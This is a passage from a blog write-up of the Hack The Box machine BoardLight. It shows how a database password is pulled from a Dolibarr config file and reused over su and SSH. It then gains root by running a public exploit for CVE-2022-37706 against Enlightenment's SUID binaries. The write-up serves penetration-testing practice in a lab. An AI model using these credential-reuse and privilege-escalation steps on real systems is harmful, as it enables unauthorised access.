</span></span></span><span class=line><span class=cl><span class=go></span><span class=gp>$</span><span class=nv>dolibarr_main_url_root</span><span class=o>=</span><span class=s1>&#39;http://crm.board.htb&#39;</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=gp>$</span><span class=nv>dolibarr_main_document_root</span><span class=o>=</span><span class=s1>&#39;/var/www/html/crm.board.htb/htdocs&#39;</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=gp>$</span><span class=nv>dolibarr_main_url_root_alt</span><span class=o>=</span><span class=s1>&#39;/custom&#39;</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=gp>$</span><span class=nv>dolibarr_main_document_root_alt</span><span class=o>=</span><span class=s1>&#39;/var/www/html/crm.board.htb/htdocs/custom&#39;</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=gp>$</span><span class=nv>dolibarr_main_data_root</span><span class=o>=</span><span class=s1>&#39;/var/www/html/crm.board.htb/documents&#39;</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=gp>$</span><span class=nv>dolibarr_main_db_host</span><span class=o>=</span><span class=s1>&#39;localhost&#39;</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=gp>$</span><span class=nv>dolibarr_main_db_port</span><span class=o>=</span><span class=s1>&#39;3306&#39;</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=gp>$</span><span class=nv>dolibarr_main_db_name</span><span class=o>=</span><span class=s1>&#39;dolibarr&#39;</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=gp>$</span><span class=nv>dolibarr_main_db_prefix</span><span class=o>=</span><span class=s1>&#39;llx_&#39;</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=gp>$</span><span class=nv>dolibarr_main_db_user</span><span class=o>=</span><span class=s1>&#39;dolibarrowner&#39;</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=gp>$</span><span class=nv>dolibarr_main_db_pass</span><span class=o>=</span><span class=s1>&#39;serverfun2$2023!!&#39;</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=gp>$</span><span class=nv>dolibarr_main_db_type</span><span class=o>=</span><span class=s1>&#39;mysqli&#39;</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=gp>$</span><span class=nv>dolibarr_main_db_character_set</span><span class=o>=</span><span class=s1>&#39;utf8&#39;</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=gp>$</span><span class=nv>dolibarr_main_db_collation</span><span class=o>=</span><span class=s1>&#39;utf8_unicode_ci&#39;</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=gp>$</span><span class=nv>dolibarr_main_authentication</span><span class=o>=</span><span class=s1>&#39;dolibarr&#39;</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=gp>$</span><span class=nv>dolibarr_main_prod</span><span class=o>=</span><span class=s1>&#39;0&#39;</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=gp>$</span><span class=nv>dolibarr_main_force_https</span><span class=o>=</span><span class=s1>&#39;0&#39;</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=gp>$</span><span class=nv>dolibarr_main_restrict_os_commands</span><span class=o>=</span><span class=s1>&#39;mysqldump, mysql, pg_dump, pgrestore&#39;</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=gp>$</span><span class=nv>dolibarr_nocsrfcheck</span><span class=o>=</span><span class=s1>&#39;0&#39;</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=gp>$</span><span class=nv>dolibarr_main_instance_unique_id</span><span class=o>=</span><span class=s1>&#39;ef9a8f59524328e3c36894a9ff0562b5&#39;</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=gp>$</span><span class=nv>dolibarr_mailing_limit_sendbyweb</span><span class=o>=</span><span class=s1>&#39;0&#39;</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=gp>$</span><span class=nv>dolibarr_mailing_limit_sendbycli</span><span class=o>=</span><span class=s1>&#39;0&#39;</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=gp>$</span><span class=nv>dolibarr_main_distrib</span><span class=o>=</span><span class=s1>&#39;standard&#39;</span><span class=p>;</span>
</span></span></code></pre></div><p>where I can see credentials: <code>dolibarrowner:serverfun2$2023!!</code></p><p>They seems like credentials for <code>MySQL</code>. I verify that port <code>3306</code> is internally open:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell-session data-lang=shell-session><span class=line><span class=cl><span class=go>www-data@boardlight:~/html/crm.board.htb/htdocs/website$ ss -ntlp
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>State               Recv-Q              Send-Q                           Local Address:Port                            Peer Address:Port              Process
</span></span></span><span class=line><span class=cl><span class=go>LISTEN              0                   128                                    0.0.0.0:22                                   0.0.0.0:*
</span></span></span><span class=line><span class=cl><span class=go>LISTEN              0                   4096                             127.0.0.53%lo:53                                   0.0.0.0:*
</span></span></span><span class=line><span class=cl><span class=go>LISTEN              0                   70                                   127.0.0.1:33060                                0.0.0.0:*
</span></span></span><span class=line><span class=cl><span class=go>LISTEN              0                   151                                  127.0.0.1:3306                                 0.0.0.0:*
</span></span></span><span class=line><span class=cl><span class=go>LISTEN              0                   511                                          *:80                                         *:*
</span></span></span></code></pre></div><p>Enter in <code>MySQL</code> database:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell-session data-lang=shell-session><span class=line><span class=cl><span class=go>www-data@boardlight:~/html/crm.board.htb/htdocs/website$ mysql -u &#39;dolibarrowner&#39; -p&#39;serverfun2$2023!!&#39;
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>mysql: [Warning] Using a password on the command line interface can be insecure.
</span></span></span><span class=line><span class=cl><span class=go>Welcome to the MySQL monitor.  Commands end with ; or \g.
</span></span></span><span class=line><span class=cl><span class=go>Your MySQL connection id is 521
</span></span></span><span class=line><span class=cl><span class=go>Server version: 8.0.36-0ubuntu0.20.04.1 (Ubuntu)
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>Copyright (c) 2000, 2024, Oracle and/or its affiliates.
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>Oracle is a registered trademark of Oracle Corporation and/or its
</span></span></span><span class=line><span class=cl><span class=go>affiliates. Other names may be trademarks of their respective
</span></span></span><span class=line><span class=cl><span class=go>owners.
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>Type &#39;help;&#39; or &#39;\h&#39; for help. Type &#39;\c&#39; to clear the current input statement.
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>mysql&gt;
</span></span></span></code></pre></div><p>But before entering into a rabbit hole I just thought &ldquo;what if this the password for the user <code>larissa</code> that also exists on the system?&rdquo;</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell-session data-lang=shell-session><span class=line><span class=cl><span class=go>www-data@boardlight:~/html/crm.board.htb/htdocs/website$ su larissa
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>Password:
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>larissa@boardlight:/var/www/html/crm.board.htb/htdocs/website$
</span></span></span></code></pre></div><p>so we have found credentials: <code>larisa:serverfun2$2023!!</code></p><p>I also check with <code>NetExec</code> if I can log in via <code>SSH</code> with these credentials and we can:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell-session data-lang=shell-session><span class=line><span class=cl><span class=go>‚ùØ netexec ssh 10.10.11.11 -u &#39;larissa&#39; -p &#39;serverfun2$2023!!&#39;
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>SSH         10.10.11.11     22     10.10.11.11      [*] SSH-2.0-OpenSSH_8.2p1 Ubuntu-4ubuntu0.11
</span></span></span><span class=line><span class=cl><span class=go>SSH         10.10.11.11     22     10.10.11.11      [+] larissa:serverfun2$2023!!  (non root) Linux - Shell access!
</span></span></span></code></pre></div><p>so I log in via <code>SSH</code>:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell-session data-lang=shell-session><span class=line><span class=cl><span class=go>‚ùØ sshpass -p &#39;serverfun2$2023!!&#39; ssh -o stricthostkeychecking=no larissa@10.10.11.11
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>Warning: Permanently added &#39;10.10.11.11&#39; (ED25519) to the list of known hosts.
</span></span></span><span class=line><span class=cl><span class=go>larissa@boardlight:~$ whoami
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>larissa
</span></span></span></code></pre></div><p>We can read the user flag at this user&rsquo;s <code>/home</code> directory.</p><hr><h2 id=root>Root
<a class=heading-link href=#root><i class="fa-solid fa-link" aria-hidden=true title="Link to heading"></i>
<span class=sr-only>Link to heading</span></a></h2><p>Searching for <code>SUID</code> files I can see 4 that are not &ldquo;usual&rdquo;:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell-session data-lang=shell-session><span class=line><span class=cl><span class=go>larissa@boardlight:~$ find / -perm -4000 2&gt;/dev/null
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>&lt;SNIP&gt;
</span></span></span><span class=line><span class=cl><span class=go>/usr/lib/x86_64-linux-gnu/enlightenment/utils/enlightenment_sys
</span></span></span><span class=line><span class=cl><span class=go>/usr/lib/x86_64-linux-gnu/enlightenment/utils/enlightenment_ckpasswd
</span></span></span><span class=line><span class=cl><span class=go>/usr/lib/x86_64-linux-gnu/enlightenment/utils/enlightenment_backlight
</span></span></span><span class=line><span class=cl><span class=go>/usr/lib/x86_64-linux-gnu/enlightenment/modules/cpufreq/linux-gnu-x86_64-0.23.1/freqset
</span></span></span><span class=line><span class=cl><span class=go>&lt;SNIP&gt;
</span></span></span></code></pre></div><div class="notice info"><div class=notice-title><i class="fa-solid fa-exclamation-circle" aria-hidden=true></i>Info</div><div class=notice-content><code>Enlightenment</code> is a Window Manager, Compositor and Minimal Desktop for <code>Linux</code> (the primary platform), BSD and any other compatible UNIX system</div></div><p>Searching for exploits for <code>Enlightment</code> we find the vulnerability <a href=https://nvd.nist.gov/vuln/detail/CVE-2022-37706 class=external-link target=_blank rel=noopener>CVE-2022-37706</a>. We can see that we can exploit it using <a href=https://www.exploit-db.com/exploits/51180 class=external-link target=_blank rel=noopener>this exploit</a> from <code>exploit-db</code> or <a href=https://github.com/MaherAzzouzi/CVE-2022-37706-LPE-exploit class=external-link target=_blank rel=noopener>this Github repository</a>. Both do pretty much the same. Using the second option I just copy the code (since it is just <code>Bash</code> code), open a file with <code>nano</code> called <code>/tmp/exp.sh</code> in the target machine, pass the code, save it, assign to it execution permissions and execute it:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell-session data-lang=shell-session><span class=line><span class=cl><span class=go>larissa@boardlight:~$ nano /tmp/exp.sh
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>larissa@boardlight:~$ chmod +x /tmp/exp.sh
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>larissa@boardlight:~$ /tmp/exp.sh
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>CVE-2022-37706
</span></span></span><span class=line><span class=cl><span class=go>[*] Trying to find the vulnerable SUID file...
</span></span></span><span class=line><span class=cl><span class=go>[*] This may take few seconds...
</span></span></span><span class=line><span class=cl><span class=go>[+] Vulnerable SUID binary found!
</span></span></span><span class=line><span class=cl><span class=go>[+] Trying to pop a root shell!
</span></span></span><span class=line><span class=cl><span class=go>[+] Enjoy the root shell :)
</span></span></span><span class=line><span class=cl><span class=go>mount: /dev/../tmp/: can&#39;t find in /etc/fstab.
</span></span></span><span class=line><span class=cl><span class=go></span><span class=gp>#</span> whoami
</span></span><span class=line><span class=cl><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>root
</span></span></span></code></pre></div><p>and done. We can read the <code>root</code> flag at <code>/root</code> directory</p><p>~Happy Hacking</p></div><footer></footer></article></section></div><footer class=footer><section class=container>¬©
2023 -
2024
gunzf0x
¬∑
Powered by <a href=https://gohugo.io/ target=_blank rel=noopener>Hugo</a> & <a href=https://github.com/luizdepra/hugo-coder/ target=_blank rel=noopener>Coder</a>.</section></footer></main><script src=/pentesting/js/coder.min.6ae284be93d2d19dad1f02b0039508d9aab3180a12a06dcc71b0b0ef7825a317.js integrity="sha256-auKEvpPS0Z2tHwKwA5UI2aqzGAoSoG3McbCw73gloxc="></script></body></html>